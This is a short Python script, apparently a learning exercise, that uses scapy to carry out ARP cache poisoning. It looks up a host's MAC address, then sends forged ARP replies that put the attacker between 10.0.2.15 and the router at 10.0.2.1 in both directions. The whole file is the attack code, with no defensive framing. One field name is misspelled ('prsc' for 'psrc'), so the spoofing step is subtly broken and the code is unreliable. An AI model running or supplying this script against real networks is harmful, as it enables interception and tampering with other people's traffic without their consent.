import scapy.all as scapy

# Scan the network for ARP Request
def get_mac_address(ip_range):
    # i) ARP Request
    arp_request_packet = scapy.ARP(pdst=ip_range)
    #scapy.ls(scapy.ARP())
    # ii) Broadcast Request
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())

    # Combining Requests
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1)[0]

    return answered_list[0][1].hwsrc

## Spoofing Target IP Address and MAC Address with the Router
def arp_poisoning(target_ip, poisoned_ip):
    target_mac =  get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,prsc=poisoned_ip)
    scapy.send(arp_response)
    # scapy.ls(scapy.ARP())

arp_poisoning("10.0.2.15","10.0.2.1")
arp_poisoning("10.0.2.1","10.0.2.15")

